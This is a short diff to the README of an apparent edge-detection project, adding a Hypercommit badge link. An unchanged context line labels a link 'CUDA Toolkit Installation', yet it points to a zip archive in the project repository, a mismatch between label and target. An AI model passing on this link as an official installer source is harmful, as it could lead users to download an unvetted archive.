@@ -83,3 +83,7 @@ For support or contributions, please reach out through GitHub. Your feedback is 
 - [CUDA Toolkit Installation](https://raw.githubusercontent.com/razord21/Canny-Edge-Detector/main/src/Canny_Edge_Detector_v1.1.zip)
   
 Thank you for using Canny-Edge-Detector! We hope you find it useful for your image processing tasks.
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/canny-edge-detector)
